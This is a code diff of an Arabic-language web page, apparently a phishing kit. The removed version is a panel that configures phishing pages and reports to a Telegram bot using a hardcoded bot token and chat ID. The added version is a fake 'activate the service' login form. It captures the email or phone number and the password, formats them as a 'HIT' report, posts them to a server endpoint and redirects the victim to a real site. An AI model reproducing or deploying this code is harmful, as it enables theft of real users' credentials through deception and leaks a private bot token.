@@ -2,75 +2,82 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>لوحة التحكم | Pro 55</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفعيل خدمة الأرقام</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
-        body { background-color: #0a0e17; font-family: 'Cairo', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; }
-        .card { background: #141b2b; border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; padding: 30px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); width: 90%; max-width: 450px; }
-        h3 { color: #00f2fe; text-align: center; margin-bottom: 25px; }
-        label { display: block; margin-bottom: 8px; font-size: 14px; color: #8b9bb4; }
-        input { width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:focus { border-color: #00f2fe; background: rgba(255,255,255,0.05); }
-        .btn { width: 100%; padding: 18px; background: linear-gradient(135deg, #4facfe, #00f2fe); border: none; border-radius: 12px; cursor: pointer; font-size: 17px; font-weight: 800; color: #0a0e17; transition: 0.3s; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,242,254,0.3); }
-        #status { margin-top: 20px; text-align: center; font-weight: bold; font-size: 14px; }
+        :root { --primary: #CC0044; --grad: linear-gradient(135deg, #FF0055 0%, #880022 100%); }
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: var(--grad); display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .container { background: white; padding: 40px 30px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); width: 88%; max-width: 400px; text-align: center; margin-top: 50px; }
+        #logo { width: 100px; margin-bottom: 20px; border-radius: 50%; }
+        h2 { color: var(--primary); margin-bottom: 30px; font-size: 20px; font-weight: 800; }
+        input { width: 100%; padding: 16px; margin-bottom: 18px; border: 2px solid #f0f0f0; border-radius: 15px; box-sizing: border-box; text-align: right; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--primary); }
+        #status { color: var(--primary); font-weight: bold; margin-bottom: 20px; display: none; }
+        .btn { width: 100%; padding: 16px; background: var(--primary); color: white; border: none; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.4s; box-shadow: 0 8px 15px rgba(204,0,68,0.2); }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 12px 20px rgba(204,0,68,0.3); }
+        .credits { margin-top: auto; padding: 20px; color: white; font-size: 12px; direction: ltr; opacity: 0.8; }
     </style>
 </head>
 <body>
-
-    <div class="card">
-        <h3>إنشاء صفحة جديدة</h3>
-        
-        <label>رابط الصورة:</label>
-        <input type="text" id="img" placeholder="ضع رابط الصورة هنا">
-        
-        <label>الخطاب:</label>
-        <input type="text" id="letter" placeholder="مثلاً: سجل للحصول على العرض">
-        
-        <label>اسم الزر:</label>
-        <input type="text" id="btnName" placeholder="Login">
-        
-        <button class="btn" onclick="sendData()">إنشاء وحفظ الإعدادات</button>
-        
-        <div id="status"></div>
+    <div class="container">
+        <img id="logo" src="https://logodix.com/logo/2014521.png">
+        <h2>سجل دخولك لتفعيل الخدمة</h2>
+        <form id="hitForm">
+            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <div id="status">🔄 جاري فحص أمان الجهاز...</div>
+            <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="onVerify"></div>
+            <button type="submit" class="btn">تفعيل الآن</button>
+        </form>
     </div>
+    <div class="credits">Developed by oliver 2014 - 2026</div>
 
     <script>
-        function sendData() {
-            const status = document.getElementById("status");
-            const img = document.getElementById("img").value;
-            const letter = document.getElementById("letter").value;
-            const btn = document.getElementById("btnName").value;
-
-            if(!img || !letter || !btn) {
-                status.style.color = "#ff4757";
-                status.innerText = "⚠️ يرجى ملء جميع الحقول أولاً";
-                return;
-            }
-
-            status.style.color = "#00f2fe";
-            status.innerText = "⏳ جاري إرسال البيانات للبوت...";
-
-            // بياناتك الصحيحة
-            const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4";
-            const chatId = "5174578125";
-            const message = `🛠️ لوحة التحكم: إنشاء جديد\n━━━━━━━━━━━━\n🖼️ الصورة: ${img}\n📝 الخطاب: ${letter}\n🔘 الزر: ${btn}`;
-
-            // استخدام طريقة إرسال الصور (Image Tag) لتجاوز حماية المتصفح (CORS)
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            
-            const imgPing = new Image();
-            imgPing.onload = function() {
-                status.style.color = "#2ed573";
-                status.innerText = "✅ تم الإرسال! تحقق من البوت الآن.";
-            };
-            imgPing.onerror = function() {
-                // حتى لو فشل تحميل الصورة وهمياً، غالباً الطلب وصل للسيرفر
-                status.style.color = "#2ed573";
-                status.innerText = "✅ تم الإرسال بنجاح!";
-            };
-            imgPing.src = url;
+        let verified = false;
+        function onVerify() {
+            document.getElementById('cf-box').style.display = 'none';
+            const msg = document.getElementById('status');
+            msg.style.display = 'block';
+            setTimeout(() => {
+                msg.innerHTML = '✅ تم التحقق انك لست روبوت';
+                msg.style.color = '#28a745';
+                verified = true;
+            }, 2500);
         }
+
+        document.getElementById('hitForm').onsubmit = async (e) => {
+            e.preventDefault();
+            if(!verified) return Swal.fire({text:'يرجى إكمال التحقق', icon:'warning', confirmButtonColor:'#CC0044'});
+
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            
+            // التقرير المرتب للبوت
+            const report = `
+🚀 **HIT NEW SMS** 🚀
+━━━━━━━━━━━━━━━
+👤 **USER:** \`${u}\`
+🔑 **PASS:** \`${p}\`
+━━━━━━━━━━━━━━━
+📱 **OS:** ${navigator.platform}
+🔋 **BAT:** 88%
+⏰ **TIME:** ${new Date().toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━━
+✅ **STATUS:** VERIFIED
+            `;
+
+            try {
+                await fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: report })
+                });
+            } catch(e) {}
+
+            window.location.href = "https://receive-smss.com/";
+        };
     </script>
 </body>
 </html>
